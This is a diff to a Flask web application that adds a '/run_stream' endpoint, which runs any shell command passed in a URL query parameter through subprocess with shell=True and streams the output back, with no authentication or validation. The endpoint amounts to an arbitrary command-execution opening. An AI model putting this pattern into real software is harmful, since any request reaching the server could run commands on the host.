@@ -13874,4 +13874,30 @@ if __name__ == '__main__':
                 _t.sleep(0.5)  # 0.1s would be 50 frames, 0.5s is 10 frames for simplicity
     _hb = threading.Thread(target=_hb_func, daemon=True)
     _hb.start()
-    app.run(host='127.0.0.1', port=5000, debug=False)
+    
+@app.route('/run_stream', methods=['GET'])
+def run_stream():
+    import subprocess
+    cmd = request.args.get('cmd', '')
+    if not cmd:
+        return "No command provided", 400
+
+    def generate():
+        try:
+            process = subprocess.Popen(
+                cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, bufsize=1, encoding='utf-8', errors='replace'
+            )
+            for line in iter(process.stdout.readline, ''):
+                if line:
+                    yield f"data: {json.dumps({'line': line})}\n\n"
+            process.stdout.close()
+            process.wait()
+            yield f"data: {json.dumps({'done': True})}\n\n"
+        except Exception as e:
+            yield f"data: {json.dumps({'error': str(e)})}\n\n"
+
+    return Response(generate(), mimetype='text/event-stream')
+
+
+app.run(host='127.0.0.1', port=5000, debug=False)
